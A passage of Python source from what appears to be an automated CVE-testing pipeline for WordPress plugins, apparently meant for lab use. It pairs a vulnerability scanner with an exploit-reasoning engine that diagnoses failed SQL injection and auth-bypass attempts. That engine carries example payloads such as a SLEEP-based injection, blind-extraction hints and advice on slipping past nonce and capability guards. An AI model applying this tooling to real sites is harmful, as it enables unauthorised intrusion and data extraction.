                for sink_pat, mitig_pat, vuln_class in active_sinks:
                    for m in re.finditer(sink_pat, content, re.I | re.DOTALL):
                        window = content[max(0, m.start() - 50): m.start() + 600]
                        if mitig_pat and re.search(mitig_pat, window, re.I):
                            continue
                        lineno = content[:m.start()].count("\n") + 1
                        snippet = content[m.start(): m.start() + 120].replace("\n", " ")
                        findings.append(SecurityFinding(
                            vuln_class=vuln_class,
                            description=f"Potential {vuln_class.replace('_', ' ')} at line {lineno}",
                            evidence=[f"{rel}:{lineno}: `{snippet}`"],
                            confidence=0.75,
                            location=f"{rel}:{lineno}",
                        ))

                # Mode 4: hardcoded secrets
                for pat, label in self._HARDCODED_PATTERNS:
                    for m in re.finditer(pat, content, re.I):
                        snippet = m.group(0)
                        if any(x in snippet.lower() for x in
                               ("example", "placeholder", "your_", "xxx", "todo", "changeme",
                                "test", "dummy", "fake", "localhost", "sample")):
                            continue
                        lineno = content[:m.start()].count("\n") + 1
                        safe_snippet = re.sub(r"""(['"])[^'"]{8,}(['"])""",
                                              r"\1***REDACTED***\2", snippet)
                        findings.append(SecurityFinding(
                            vuln_class=label,
                            description=f"Potential hardcoded credential at line {lineno}",
                            evidence=[f"{rel}:{lineno}: `{safe_snippet}`"],
                            confidence=0.65,
                            location=f"{rel}:{lineno}",
                        ))

        # Deduplicate: same vuln_class + location → keep highest confidence
        seen: Dict[str, SecurityFinding] = {}
        for f in findings:
            key = f"{f.vuln_class}::{f.location}"
            if key not in seen or f.confidence > seen[key].confidence:
                seen[key] = f
        return sorted(seen.values(), key=lambda x: x.confidence, reverse=True)

    def analyze_auth_flow(
        self,
        source_dir: str,
        endpoint: str = "",
        max_files: int = 300,
    ) -> List[SecurityFinding]:
        return [f for f in self.scan_for_vulnerabilities(source_dir, max_files)
                if "auth_bypass" in f.vuln_class or "no_auth" in f.vuln_class
                or "always_true" in f.vuln_class]

    def check_bypass_evidence(self, response_body: str, cookies: Dict,
                               victim_email: str = "") -> bool:
        """Returns True if runtime evidence confirms an auth bypass."""
        if victim_email and re.search(re.escape(victim_email), response_body, re.IGNORECASE):
            return True
        if cookies and any(
            "wordpress_logged_in" in k or "auth" in k.lower()
            for k in cookies
        ):
            return True
        return False


# ─────────────────────────── 3. Remediation Engine ────────────────────────────

class RemediationEngine:
    """
    Implements the DETECT → ANALYZE → UNDERSTAND → DIAGNOSE →
    PROPOSE → VALIDATE → CORRECT → VERIFY cycle.

    Usage:
        engine = RemediationEngine(source_intel)
        result = engine.remediate(
            error_signal=sig,
            current_params=params,
            source_dir="/path/to/plugin",
            make_request=lambda p: session.post(url, data=p),
            on_step=print,
        )
        if result.success:
            final_response = result.final_signal.raw
    """

    def __init__(self, source_intel: Optional[SourceCodeIntelligence] = None):
        self._src = source_intel or SourceCodeIntelligence()

    def _analyze(self, signal: ErrorSignal, source_dir: str,
                  current_params: Dict) -> Tuple[RootCause, List[Fix]]:
        """Core reasoning: map error signal → root cause → proposed fixes."""
        cause = RootCause(signal=signal, hypothesis="", confidence=0.0)
        fixes: List[Fix] = []

        # ── Validation errors: missing or invalid params ──────────────────
        if signal.kind == ErrorKind.VALIDATION:
            # Extract which params are problematic
            if signal.code in ("rest_missing_callback_param", "rest_invalid_param"):
                raw_params = signal.details.get("params") or {}
                if isinstance(raw_params, list):
                    bad_params = raw_params
                    err_detail: Dict = {}
                elif isinstance(raw_params, dict):
                    bad_params = list(raw_params.keys())
                    err_detail = signal.details.get("details") or {}
                else:
                    bad_params = []
                    err_detail = {}

                cause.hypothesis = (
                    f"Endpoint requires parameters that are absent or invalid: {bad_params}. "
                    f"These are enforced by the framework's schema before the handler runs."
                )
                cause.confidence = 0.95
                cause.evidence.append(f"REST error code: {signal.code}")
                cause.evidence.append(f"Problematic params: {bad_params}")

                # Find definitions from source
                if bad_params and os.path.isdir(source_dir):
                    defs = self._src.find_param_definitions(source_dir, bad_params)
                    cause.param_defs = list(defs.values())

                # Build fix: infer one valid value per missing/invalid param
                new_values: Dict[str, str] = {}
                for pname in bad_params:
                    pdef  = defs.get(pname) if bad_params and os.path.isdir(source_dir) else None
                    detail_msg = ""
                    d_entry = err_detail.get(pname)
                    if isinstance(d_entry, dict):
                        detail_msg = d_entry.get("message") or ""
                    elif isinstance(d_entry, str):
                        detail_msg = d_entry
                    val = self._src.infer_valid_value(pname, pdef, detail_msg)
                    new_values[pname] = val
                    cause.evidence.append(
                        f"Inferred '{pname}'='{val}' from "
                        f"{'error message' if detail_msg else 'source code' if pdef else 'semantic default'}"
                    )

                if new_values:
                    fixes.append(Fix(
                        description=f"Add inferred values for params: {list(new_values.keys())}",
                        changes=new_values,
                        reversible=True,
                        rationale="Values derived from (1) error message, (2) source schema, (3) semantic name",
                    ))

            else:
                cause.hypothesis = f"Validation error: {signal.message}"
                cause.confidence = 0.6

        # ── Auth / permission errors ──────────────────────────────────────
        elif signal.kind == ErrorKind.AUTH:
            # Detect bypass pattern: 403 but auth cookie is set in the response
            resp_cookies: Dict = {}
            if signal.raw is not None:
                try:
                    resp_cookies = dict(getattr(signal.raw, "cookies", {}))
                except Exception:
                    pass
            bypass_cookie = any(
                "wordpress_logged_in" in k or "_logged" in k or "auth_token" in k
                for k in resp_cookies
            )
            if bypass_cookie:
                cause.hypothesis = (
                    "AUTH 403 AND an auth cookie is set — matches the auth-bypass pattern. "
                    "The server set the session cookie before rejecting with 403. "
                    "The cookie can likely be used to access protected resources."
                )
                cause.confidence = 0.90
                cause.evidence.append(
                    f"Auth cookie found in 403 response: {list(resp_cookies.keys())}"
                )
                fixes.append(Fix(
                    description="Use the auth cookie from this 403 response",
                    changes={"_meta_bypass_cookie": str(resp_cookies)},
                    reversible=True,
                    rationale="Auth bypass confirmed: cookie set before role check",
                ))
            else:
                cause.hypothesis = (
                    "Real authentication failure (no bypass cookie set). "
                    "The endpoint requires valid credentials or a specific role. "
                    "If testing an auth bypass, verify the endpoint and params are correct."
                )
                cause.confidence = 0.70

        # ── 404 / route not found ─────────────────────────────────────────
        elif signal.kind == ErrorKind.NOT_FOUND:
            cause.hypothesis = (
                "The endpoint returned 404. Common causes: "
                "(1) plugin inactive, (2) WordPress permalinks not set to /%postname%/, "
                "(3) route namespace mismatch, (4) trailing slash difference."
            )
            cause.confidence = 0.75
            cause.evidence.append(f"404 on: {signal.details.get('url', signal.message[:80])}")
            fixes.append(Fix(
                description="Try endpoint variants and check plugin activation",
                changes={"_meta_action": "try_endpoint_variants"},
                reversible=True,
                rationale=(
                    "WordPress REST routes require: active plugin + flushed permalinks "
                    "+ correct namespace. Try without trailing slash, or /wp/v2/ vs custom namespace."
                ),
            ))

        # ── Process / dependency errors (e.g. WP-CLI exit) ───────────────
        elif signal.kind in (ErrorKind.PROCESS, ErrorKind.DEPENDENCY):
            cause.hypothesis = (
                f"Process exited with error ({signal.code}): {signal.message[:150]}. "
                "This may indicate a missing class/callable registration that fires "
                "in CLI mode but is harmless for HTTP requests."
            )
            cause.confidence = 0.65

        # ── Server errors (500) ───────────────────────────────────────────
        elif signal.kind == ErrorKind.SERVER:
            body = ""
            if signal.raw is not None:
                try:
                    body = getattr(signal.raw, "text", "") or ""
                except Exception:
                    pass
            body = body or signal.message
            class_m = re.search(r"Class ['\"]?([A-Za-z\\][A-Za-z0-9\\:_]+)['\"]? not found", body)
            func_m  = re.search(r"Call to undefined (?:function|method) ([A-Za-z\\:_]+\(\))", body)
            mem_m   = re.search(r"(?:Allowed memory size|Out of memory)", body)
            if class_m:
                cls = class_m.group(1)
                cause.hypothesis = (
                    f"PHP fatal: class '{cls}' not found — missing dependency or inactive plugin"
                )
                cause.confidence = 0.88
                cause.evidence.append(f"PHP error: {class_m.group(0)}")
            elif func_m:
                fn = func_m.group(1)
                cause.hypothesis = f"PHP fatal: function/method '{fn}' undefined"
                cause.confidence = 0.85
                cause.evidence.append(f"PHP error: {func_m.group(0)}")
            elif mem_m:
                cause.hypothesis = "PHP out of memory — increase memory_limit or reduce request size"
                cause.confidence = 0.80
            else:
                cause.hypothesis = f"Server error 500: {signal.message[:150]}"
                cause.confidence = 0.50

        else:
            cause.hypothesis = f"Unknown error class ({signal.code}): {signal.message[:150]}"
            cause.confidence = 0.3

        return cause, fixes

    def remediate(
        self,
        error_signal: ErrorSignal,
        current_params: Dict,
        source_dir: str,
        make_request: Callable[[Dict], Any],
        on_step: Optional[Callable[[str], None]] = None,
        max_attempts: int = 3,
    ) -> RemediationResult:
        """
        DETECT → ANALYZE → DIAGNOSE → PROPOSE → VALIDATE → CORRECT → VERIFY.
        Returns the final RemediationResult including the last response.
        """
        def _log(msg: str) -> None:
            if on_step:
                on_step(msg)

        log: List[str] = []
        applied: List[Fix] = []
        params = dict(current_params)
        last_signal: Optional[ErrorSignal] = error_signal

        for attempt in range(1, max_attempts + 1):
            if last_signal is None:
                break
            if last_signal.kind not in (ErrorKind.VALIDATION,):
                # Only retry for validation errors; other errors need different handling
                break

            cause, fixes = self._analyze(last_signal, source_dir, params)
            if not fixes:
                _log(f"[engine] no se pudo proponer una correccion para {last_signal.code}")
                break

            fix = fixes[0]
            _log(
                f"[engine] intento {attempt}/{max_attempts}: "
                f"{fix.description} — {fix.rationale}"
            )
            msg_parts = []
            for k, v in fix.changes.items():
                msg_parts.append(f"{k}={v!r}")
            _log(f"[engine] corrigiendo params: {', '.join(msg_parts)}")

            params.update(fix.changes)
            applied.append(fix)
            log.append(f"attempt {attempt}: {fix.description}")

            # Execute the fixed request
            try:
                response = make_request(params)
            except Exception as e:
                _log(f"[engine] fallo en reintento {attempt}: {e}")
                break

            # Parse new signal
            new_signal = ErrorSignal.from_http(response)
            if new_signal is None:
                break

            last_signal = new_signal
            if new_signal.kind not in (ErrorKind.VALIDATION,):
                # Non-validation response: either success or a different error class
                break

        success = (last_signal is None or
                   last_signal.kind not in (ErrorKind.VALIDATION, ErrorKind.NOT_FOUND))
        return RemediationResult(
            success=success,
            attempts=len(applied),
            fixes_applied=applied,
            final_signal=last_signal,
            log=log,
        )


# ─────────────── 3b. Exploit Reasoning Engine ────────────────────────────────
#
# General-purpose exploit-research reasoning layer.  Unlike RemediationEngine
# (which fixes parameter validation errors), this module thinks like an exploit
# developer: given a failed or unexpected HTTP/process response it asks WHY the
# payload did not land, then proposes the most likely root cause + targeted fix.
#
# Design principle: ALL reasoning must be driven by evidence in the response body
# (status code, error text, known guard patterns) — never hardcoded per CVE.  A
# finding that applies to CVE-2024-1071 must equally apply to any OTHER SQLi with
# an equivalent guard pattern.
#
# Five reasoning chains (each language/framework-agnostic):
#   1. AUTH_GATE_FIRED      — a capability / role / login guard short-circuited
#   2. RESOURCE_NOT_FOUND   — the resource ID / hash / slug didn't resolve
#   3. NONCE_MISMATCH       — CSRF / nonce token was for wrong user/session
#   4. INJECTION_CONTEXT    — payload was sanitised or hit wrong SQL context
#   5. FRAMEWORK_PROTECTION — framework-level output or query escaping fired
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class ExploitHypothesis:
    """A single reasoned hypothesis about why an exploit attempt failed."""
    chain:      str         # one of the five chain names above
    summary:    str         # one sentence: what the engine thinks happened
    evidence:   List[str]   # substrings in the response that support this
    confidence: float       # 0.0 – 1.0
    fix_hint:   str         # what to change in the next attempt
    fix_params: Dict[str, Any] = field(default_factory=dict)   # concrete param overrides


@dataclass
class ExploitAnalysis:
    """Result of ExploitReasoningEngine.analyze_response()."""
    succeeded:    bool
    hypotheses:   List[ExploitHypothesis]  = field(default_factory=list)
    best:         Optional[ExploitHypothesis] = None
    raw_response: str = ""


@dataclass
class SourceAnalysisHint:
    """
    Structured output of static source analysis performed BEFORE the first probe.

    Feeds into lab bootstrap so the engine can pre-configure gating conditions
    (e.g. a WP option that enables the vulnerable code path) that would otherwise
    be discovered only through failed probe attempts.
    """
    gating_options: Dict[str, str] = field(default_factory=dict)
    # e.g. {"member_directory_own_table": "1"} — applied via wp-cli option patch
    required_session: str = "subscriber"
    # "anonymous" | "subscriber" | "admin"
    injection_context: str = ""
    # "ORDER BY" | "WHERE" | "HAVING" | "INSERT" | "UPDATE" | ""
    anon_guard_patterns: List[str] = field(default_factory=list)
    # PHP function names that force anonymous session (e.g. predefined_no_caps)
    setup_admin_paths: List[str] = field(default_factory=list)
    # WP-admin URLs to visit during bootstrap to activate the plugin's features
    confidence: float = 0.0
    evidence: List[str] = field(default_factory=list)


class ExploitReasoningEngine:
    """
    Reasons about failed exploit attempts from HTTP/process responses.

    Usage::

        era = ExploitReasoningEngine()
        analysis = era.analyze_response(
            response_body   = '{"success":false,"data":"Wrong member directory data"}',
            status_code     = 200,
            vuln_class      = "sqli",
            payload_sent    = ",(SELECT SLEEP(5))",
            param_name      = "sorting",
            source_evidence = {},   # optional: code snippets / known guard patterns
        )
        if not analysis.succeeded and analysis.best:
            print(analysis.best.fix_hint)

    All reasoning is pattern-based and language-agnostic: a "guard fired" signal
    in a PHP JSON response looks the same as one in a Python DRF response.
    """

    # ── Signal dictionaries ───────────────────────────────────────────────────
    # Each entry: (regex_to_match_in_body, chain, weight, fix_hint_template)
    # Regexes are case-insensitive and applied to the FULL response body.
    _SIGNALS: List[Tuple[str, str, float, str]] = [
        # AUTH_GATE_FIRED signals
        (r"\b(?:wrong\s+member\s+directory\s+data|no\s+directory\s+found|"
         r"directory\s+not\s+found|invalid\s+directory)\b",
         "RESOURCE_NOT_FOUND", 0.85,
         "resolve the resource ID/hash to a real object — the server cannot find the "
         "target resource; check that the identifier sent matches one that exists"),

        (r"\b(?:wrong\s+nonce|invalid\s+nonce|nonce\s+verification\s+failed|"
         r"security\s+check\s+failed|bad\s+nonce|token\s+mismatch)\b",
         "NONCE_MISMATCH", 0.90,
         "re-scrape the nonce with the same session/user that will send the attack; "
         "nonces are user-specific — a nonce generated for user A does not verify for user B"),

        (r"\b(?:permission\s+denied|access\s+denied|forbidden|insufficient\s+(?:permissions?|"
         r"privilege)|you\s+do\s+not\s+have\s+(?:permission|access)|capability\s+check\s+failed|"
         r"not\s+allowed|unauthorized|auth(?:orization)?\s+required)\b",
         "AUTH_GATE_FIRED", 0.88,
         "bypass the auth gate: use an anonymous session if the endpoint is unauthenticated, "
         "or escalate to a role that passes the capability check"),

        (r"\b(?:predefined_no_caps|can_view_all|no\s+caps?|empty\s+users|"
         r"users.*\[\s*\]|\"users\":\s*\[\s*\])\b",
         "AUTH_GATE_FIRED", 0.92,
         "predefined_no_caps guard fired — use an anonymous session (no cookies) so "
         "is_user_logged_in() returns false and the guard is skipped"),

        (r"\b(?:not\s+a\s+valid\s+(?:table|column|field)|unknown\s+column|"
         r"you\s+have\s+an\s+error\s+in\s+your\s+sql|sql\s+syntax|syntax\s+error.*sql|"
         r"unrecognized\s+token)\b",
         "INJECTION_CONTEXT", 0.80,
         "SQL syntax error from the server — the payload was injected but the context is wrong; "
         "try different quoting (', \", none) or comment styles (-- -, #, /**/"),

        (r"\b(?:extractvalue|updatexml|xpath.*error|xpath.*invalid|"
         r"xpath.*[0-9a-f]{5,})\b",
         "INJECTION_CONTEXT", 0.95,
         "XPath error signature found — error-based injection landed; "
         "extract the substring between the delimiters for the data"),

        (r"(?:[0-9]+\.[0-9]+\.[0-9]+-(?:MariaDB|MySQL|ubuntu|debian))",
         "INJECTION_CONTEXT", 0.98,
         "MySQL/MariaDB version string found in response — UNION or error-based injection "
         "confirmed; extract data from subsequent payloads"),

        (r"\b(?:sanitize_text_field|wpdb->prepare|esc_sql|addslashes|"
         r"mysqli_real_escape|pg_escape_string|htmlspecialchars)\b",
         "FRAMEWORK_PROTECTION", 0.75,
         "framework sanitization function name appeared in response/error — verify whether "
         "it applies to the specific vulnerable parameter or only to surrounding ones"),

        (r"\b(?:timed?\s+out|connection\s+timed?\s+out|read\s+timed?\s+out|"
         r"gateway\s+timed?\s+out|504|408)\b",
         "INJECTION_CONTEXT", 0.80,
         "timeout detected — time-based blind injection likely landed; "
         "confirm with a CASE WHEN (1=1) THEN SLEEP(N) ELSE 0 END conditional pair"),

        # RESOURCE_NOT_FOUND — WordPress object resolution failures
        (r"\b(?:invalid\s+post\s+id|post\s+not\s+found|page\s+not\s+found|"
         r"term\s+not\s+found|attachment\s+not\s+found|no\s+results\s+found|"
         r"\"total_users\":\s*0|\"users\":\s*\[\s*\])\b",
         "RESOURCE_NOT_FOUND", 0.75,
         "WordPress object (post/page/term/user) not found — verify the resource ID "
         "resolves to an existing object; check hash/ID mapping"),

        # AUTH_GATE_FIRED — additional WordPress / REST guards
        (r"\b(?:rest_forbidden|rest_cannot_access|rest_user_cannot_edit|"
         r"rest_not_logged_in|rest_login_required|woocommerce_rest_cannot_view|"
         r"you\s+must\s+be\s+logged\s+in|please\s+log\s+in)\b",
         "AUTH_GATE_FIRED", 0.88,
         "REST API auth guard fired — provide a valid auth token (cookie or Application Password)"),

        # INJECTION_CONTEXT — PostgreSQL error signatures
        (r"\b(?:pg_query|psql\s+error|pdo.*pgsql|ERROR:\s+syntax\s+error\s+at\s+or\s+near|"
         r"unterminated\s+quoted\s+string|invalid\s+input\s+syntax\s+for\s+type)\b",
         "INJECTION_CONTEXT", 0.80,
         "PostgreSQL error signature — adapt payload syntax: use $$ quoting, "
         "CAST(), and avoid MySQL-specific functions"),

        # INJECTION_CONTEXT — MSSQL / SQL Server error signatures
        (r"\b(?:unclosed\s+quotation\s+mark|incorrect\s+syntax\s+near|"
         r"conversion\s+failed\s+when\s+converting|mssql|sqlsrv)\b",
         "INJECTION_CONTEXT", 0.80,
         "MSSQL/SQL Server error — adapt payload: use WAITFOR DELAY, TOP/NOLOCK hints, "
         "and stacked queries with semicolons"),

        # FRAMEWORK_PROTECTION — ORM layer may already be parameterizing the query
        (r"\b(?:sequelize|typeorm|eloquent|knex|prisma|doctrine|hibernate|"
         r"active_record|django\.db|sqlalchemy)\b",
         "FRAMEWORK_PROTECTION", 0.70,
         "ORM framework name in response — injection may be parameterized at the ORM level; "
         "look for raw() / execute() / annotate() calls that bypass the ORM"),

        # INJECTION_CONTEXT — generic invalid input / payload broke parsing before SQL
        (r"\b(?:invalid\s+input|malformed\s+request|bad\s+request|400\s+bad\s+request)\b",
         "INJECTION_CONTEXT", 0.55,
         "Invalid input response — payload may have broken request parsing before reaching SQL; "
         "try URL-encoding or reducing payload complexity"),
    ]

    # Signals derived from HTTP status code alone
    _STATUS_SIGNALS: Dict[int, Tuple[str, float, str]] = {
        200: ("INJECTION_CONTEXT", 0.10, "200 OK — baseline established, check body diff"),
        302: ("AUTH_GATE_FIRED", 0.70, "redirect likely to login — the endpoint requires auth"),
        401: ("AUTH_GATE_FIRED", 0.90, "401 Unauthorized — missing or invalid credentials"),
        403: ("AUTH_GATE_FIRED", 0.90, "403 Forbidden — insufficient role or capability"),
        500: ("INJECTION_CONTEXT", 0.60, "500 error — possible injection syntax error; "
              "check debug output for SQL trace"),
    }

    def analyze_response(
        self,
        response_body:    str,
        status_code:      int           = 200,
        vuln_class:       str           = "",
        payload_sent:     str           = "",
        param_name:       str           = "",
        source_evidence:  Dict[str, Any] = None,
        baseline_body:    str           = "",
    ) -> ExploitAnalysis:
        """
        Reason about a single attempt's response and return a ranked list of
        hypotheses about why it failed (or succeeded).

        `baseline_body`: if provided, the diff length between baseline and
        this response is used as a boolean-blind signal.
        """
        body = response_body or ""
        lower = body.lower()
        hyps: List[ExploitHypothesis] = []

        # Check for immediate success indicators
        succeeded = False
        if vuln_class == "sqli":
            # Version string in body → confirmed extraction
            if re.search(r"[0-9]+\.[0-9]+\.[0-9]+-(?:MariaDB|MySQL|ubuntu|debian)",
                         body, re.I):
                succeeded = True
            # XPath error with version data
            elif re.search(r"XPATH syntax error.*[0-9a-f]{5,}", body, re.I):
                succeeded = True
            # Noticeable length diff compared to baseline (boolean-blind)
            elif baseline_body and abs(len(body) - len(baseline_body)) >= 10:
                succeeded = True

        # Apply all signal patterns
        for sig_re, chain, weight, fix_hint in self._SIGNALS:
            m = re.search(sig_re, lower, re.I)
            if m:
                hyps.append(ExploitHypothesis(
                    chain=chain,
                    summary=f"Response matched guard pattern: {m.group(0)!r}",
                    evidence=[m.group(0)],
                    confidence=weight,
                    fix_hint=fix_hint,
                ))

        # HTTP status signal
        if status_code in self._STATUS_SIGNALS:
            sc_chain, sc_weight, sc_hint = self._STATUS_SIGNALS[status_code]
            # Only add if no higher-confidence signal already covers the same chain
            existing_chains = {h.chain for h in hyps}
            if sc_chain not in existing_chains or sc_weight > 0.5:
                hyps.append(ExploitHypothesis(
                    chain=sc_chain,
                    summary=f"HTTP {status_code} status",
                    evidence=[f"HTTP {status_code}"],
                    confidence=sc_weight,
                    fix_hint=sc_hint,
                ))

        # Boolean-blind diff signal
        if baseline_body and not succeeded:
            diff = abs(len(body) - len(baseline_body))
            if diff >= 10:
                hyps.append(ExploitHypothesis(
                    chain="INJECTION_CONTEXT",
                    summary=f"Response length diff={diff} vs baseline — possible boolean signal",
                    evidence=[f"len(response)={len(body)} len(baseline)={len(baseline_body)}"],
                    confidence=min(0.9, 0.3 + diff / 200),
                    fix_hint="boolean-blind differential detected; test TRUE/FALSE condition pair "
                             "to confirm, then extract data with binary search",
                ))

        # Sort by confidence desc
        hyps.sort(key=lambda h: h.confidence, reverse=True)

        return ExploitAnalysis(
            succeeded=succeeded,
            hypotheses=hyps,
            best=hyps[0] if hyps else None,
            raw_response=body[:500],
        )

    def reason_about_lab_blocker(
        self,
        blocker_description: str,
        source_snippets:     List[str] = None,
    ) -> List[ExploitHypothesis]:
        """
        Given a human-readable blocker description (e.g. from wpverify's limitation list)
        and optional source code snippets, return hypotheses with targeted fix hints.

        Useful when the pipeline detected a code-level guard (e.g. predefined_no_caps)
        rather than an HTTP-level signal.
        """
        source_snippets = source_snippets or []
        all_text = blocker_description + "\n" + "\n".join(source_snippets)
        return self.analyze_response(
            response_body=all_text,
            status_code=200,
        ).hypotheses

    def summarize_analysis(self, analysis: ExploitAnalysis, lang: str = "en") -> str:
        """Return a one-paragraph human-readable summary of the analysis."""
        if analysis.succeeded:
            return ("Payload landed successfully. "
                    "Confirm with a data-extraction follow-up.")
        if not analysis.hypotheses:
            return "No signal detected in response — payload had no visible effect."
        lines = []
        for i, h in enumerate(analysis.hypotheses[:3], 1):
            conf_pct = int(h.confidence * 100)
            lines.append(
                f"  {i}. [{h.chain}] {h.summary} (confidence {conf_pct}%) — "
                f"fix: {h.fix_hint}"
            )
        return "Top hypotheses for why payload failed:\n" + "\n".join(lines)

    def analyze_plugin_source(
        self,
        source_dir: str,
        slug: str = "",
    ) -> SourceAnalysisHint:
        """
        Read PHP/Python/Node plugin source and extract pre-probe configuration hints.

        Runs BEFORE the first probe so the lab bootstrap can pre-configure gating
        options the engine would otherwise discover only through failed attempts
        (e.g. member_directory_own_table=1 for CVE-2024-1071).  Pure static pattern
        matching — no code execution, no network.
        """
        import os as _os
        import glob as _glob

        hint = SourceAnalysisHint()
        if not _os.path.isdir(source_dir):
            return hint

        evidence: List[str] = []

        # Collect PHP files; cap at 200 to keep latency bounded
        php_files = _glob.glob(_os.path.join(source_dir, "**", "*.php"),
                               recursive=True)[:200]
        all_source = ""
        for fp in php_files:
            try:
                with open(fp, "r", encoding="utf-8", errors="replace") as fh:
                    all_source += fh.read(8192) + "\n"
            except Exception:
                pass

        if not all_source:
            return hint

        # 1. Gating options — get_option('key') in a GUARD that short-circuits.
        # Only flag when the get_option() result is checked in a block that exits
        # (return / wp_die / die / exit) if the option is falsy.  Avoids applying
        # every plugin config key that happens to appear in an if-statement.
        _GUARD_EXITS = re.compile(
            r"\b(?:return|wp_die|die|exit|wp_send_json_error|wp_send_json)\b",
            re.I
        )
        _SKIP_OPTS = re.compile(
            r"^(?:blog|site|admin|template|active_plugins|upload|blogname|siteurl|"
            r"home|timezone|charset|lang|widget_|sidebars_widgets|"
            r".*(?:width|height|format|email|slug|notification|renewal|"
            r"expiration|comments|thumb|style|order|page|per.?page|"
            r"category|tag|cpt|rewrite|show_on_front|permalink))$",
            re.I
        )
        for m in re.finditer(
            r"get_option\s*\(\s*['\"]([^'\"]+)['\"]\s*\)", all_source, re.I
        ):
            opt_name = m.group(1)
            if _SKIP_OPTS.match(opt_name):
                continue
            # Look for: if (!get_option('x')) { return; }
            # Window before: 80 chars (the if), after: 200 chars (the return/die)
            pre = all_source[max(0, m.start() - 80): m.start()]
            post = all_source[m.end(): m.end() + 200]
            # Must be inside a negative guard (!, ==0, =='', ==false, empty())
            is_negative_guard = bool(
                re.search(r"(?:!\s*$|\bempty\s*\($|==\s*(?:0|false|''|\"\"))", pre)
                or re.search(r"(?:^[^;{]*(?:==|===|!=)\s*(?:0|false|''|\"\"))", post)
            )
            # Must have an exit within the same clause
            has_exit = bool(_GUARD_EXITS.search(post[:150]))
            if is_negative_guard and has_exit:
                val_m = re.search(r"(?:==|===)\s*['\"]?([01])['\"]?", pre + post[:60])
                expected = val_m.group(1) if val_m else "1"
                if opt_name not in hint.gating_options:
                    hint.gating_options[opt_name] = expected
                    evidence.append(
                        f"gating_option: {opt_name}={expected} "
                        f"(guard+exit near offset {m.start()})"
                    )

        # 2. Array sub-key access that acts as a hard gate (early return/die)
        for m in re.finditer(
            r"\$(?:options?|settings?|config)\s*\[\s*['\"]([^'\"]+)['\"]\s*\]",
            all_source, re.I
        ):
            opt_name = m.group(1)
            if _SKIP_OPTS.match(opt_name) or opt_name in hint.gating_options:
                continue
            pre = all_source[max(0, m.start() - 80): m.start()]
            post = all_source[m.end(): m.end() + 200]
            is_negative_guard = bool(re.search(r"(?:!\s*$|\bempty\s*\($)", pre))
            has_exit = bool(_GUARD_EXITS.search(post[:150]))
            if is_negative_guard and has_exit:
                hint.gating_options[opt_name] = "1"
                evidence.append(
                    f"gating_array_key: {opt_name} (guard+exit near offset {m.start()})"
                )

        # 3. Anonymous session guard patterns
        anon_guards = [
            "predefined_no_caps", "can_view_all", "is_user_logged_in",
            "current_user_can", "wp_verify_nonce",
        ]
        for guard in anon_guards:
            if re.search(r"\b" + re.escape(guard) + r"\b", all_source):
                for gm in list(re.finditer(re.escape(guard), all_source))[:3]:
                    snip = all_source[max(0, gm.start() - 200): gm.end() + 200]
                    if re.search(r"\b(?:return|wp_die|wp_send_json_error)\b", snip):
                        hint.anon_guard_patterns.append(guard)
                        evidence.append(f"anon_guard: {guard} with early return")
                        break

        if any(g in hint.anon_guard_patterns
               for g in ("predefined_no_caps", "can_view_all")):
            hint.required_session = "anonymous"
            evidence.append(
                "required_session=anonymous (predefined_no_caps/can_view_all)"
            )

        # 4. Injection context — ORDER BY vs WHERE raw interpolation
        orderby_m = re.search(
            r"ORDER\s+BY\s+[^;\"']{0,30}"
            r"\$(?:this->)?(?:sql_order|orderby|sortby|order_field|sort_field"
            r"|sort_col|column)\b",
            all_source, re.I
        )
        if orderby_m:
            hint.injection_context = "ORDER BY"
            evidence.append(
                f"ORDER BY raw interpolation: {orderby_m.group(0)!r}"
            )
        else:
            where_m = re.search(
                r"WHERE\s+[^;]{0,80}"
                r"\$(?:wpdb->prepare\s*\()?[a-z_]+\s*[=<>]",
                all_source, re.I
            )
            if where_m:
                hint.injection_context = "WHERE"
                evidence.append(
                    f"WHERE raw interpolation: {where_m.group(0)!r}"
                )

        # 5. Admin setup paths — custom WP admin pages this plugin registers
        admin_paths: set = set()
        for m in re.finditer(
            r"admin\.php\?page=([a-z0-9_\-]+)(?:&[a-z0-9_=\-&%]+)?",
            all_source, re.I
        ):
            admin_paths.add(f"/wp-admin/admin.php?page={m.group(1)}")
        hint.setup_admin_paths = list(admin_paths)[:5]
        if admin_paths:
            evidence.append(f"setup_admin_paths: {list(admin_paths)[:3]}")

        hint.evidence = evidence[:20]
        hint.confidence = min(0.95, 0.3 + 0.1 * len(evidence))
        return hint

    def hypothesis_to_wp_suggestion(
        self,
        hyp: ExploitHypothesis,
        extra_nonce_pages: Optional[List[str]] = None,
    ) -> Optional[Dict[str, Any]]:
        """
        Convert an ExploitHypothesis into the JSON suggestion dict expected by
        _run_evidence_retry_loop / _apply_generic_wp_suggestion (cve_agent.py).

        Returns None for chains where the LLM adds more value than pattern rules
        (RESOURCE_NOT_FOUND, INJECTION_CONTEXT) — caller falls back to LLM.
        """
        extra_nonce_pages = extra_nonce_pages or []

        if hyp.chain == "NONCE_MISMATCH":
            nonce_page = (
                "/register/"
                if "/register/" not in extra_nonce_pages
                else "/login/"
            )
            return {
                "endpoint_alternativo": None,
                "parametro_alternativo": None,
                "pagina_extra_para_nonce": nonce_page,
                "razon": (
                    f"ExploitReasoningEngine [{hyp.chain} "
                    f"conf={hyp.confidence:.0%}]: {hyp.fix_hint}"
                ),
            }

        if hyp.chain == "AUTH_GATE_FIRED":
            return {
                "endpoint_alternativo": None,
                "parametro_alternativo": None,
                "razon": (
                    f"ExploitReasoningEngine [{hyp.chain} "
                    f"conf={hyp.confidence:.0%}]: {hyp.fix_hint}"
                ),
            }

        # RESOURCE_NOT_FOUND and INJECTION_CONTEXT: LLM knows the specific
        # resource ID scheme and endpoint — defer to it
        return None


# ─────────────────────── 4. CVE Intelligence ──────────────────────────────────

@dataclass
class TestStep:
    """One concrete step in a test strategy, with a runnable curl command."""
    order:    int
    action:   str            # human-readable description
    curl:     str = ""       # runnable curl / CLI command (may contain <placeholders>)
    expected: str = ""       # what a successful hit looks like


@dataclass
class FullAnalysisResult:
    """
    Unified output of UniversalEngine.full_analysis():
    scan findings + enriched CVE profiles + test strategies + dependency vulnerabilities.
    """
    source_dir:      str
    findings:        List["SecurityFinding"]   = field(default_factory=list)
    cve_profiles:    List["CveProfile"]        = field(default_factory=list)
    test_strategies: Dict[str, List["TestStep"]] = field(default_factory=dict)
    dep_report:      Optional["DependencyReport"] = None
    vuln_deps:       List[dict]                = field(default_factory=list)
    summary:         str                       = ""


@dataclass
